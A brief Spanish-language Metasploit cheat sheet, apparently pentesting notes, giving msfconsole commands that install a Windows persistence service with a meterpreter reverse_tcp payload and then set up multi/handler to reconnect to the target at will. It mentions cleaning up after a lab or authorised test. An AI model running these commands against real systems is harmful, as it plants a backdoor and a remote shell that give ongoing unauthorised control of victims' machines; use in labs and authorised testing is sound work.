Metasploit

Los módulos de persistencia de Metasploit deben usarse con cuidado: crean servicios o mecanismos de reconexión que conviene limpiar al terminar el laboratorio o la prueba autorizada.

Comandos

# Desde metasploit y con una sesión del target activa
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set SESSION
set LHOST
run

Comandos

# Nos volvemos a conectar siempre que queramos con metasploit
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST
run
